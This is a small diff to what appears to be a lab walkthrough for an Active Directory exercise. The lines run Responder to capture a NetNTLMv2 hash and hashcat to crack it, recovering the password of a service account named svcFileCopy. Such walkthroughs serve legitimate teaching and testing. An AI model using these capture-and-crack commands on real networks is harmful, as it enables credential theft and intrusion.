@@ -112,7 +112,7 @@ sudo responder -I breachad
 # What it does: crack the captured NetNTLMv2 hash with hashcat.
 # Why here: recover the cleartext password for svcFileCopy.
 hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force
-hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force --show
+hashcat -m 5600 hash  --show
 ```
 
 **Recovered credential:**
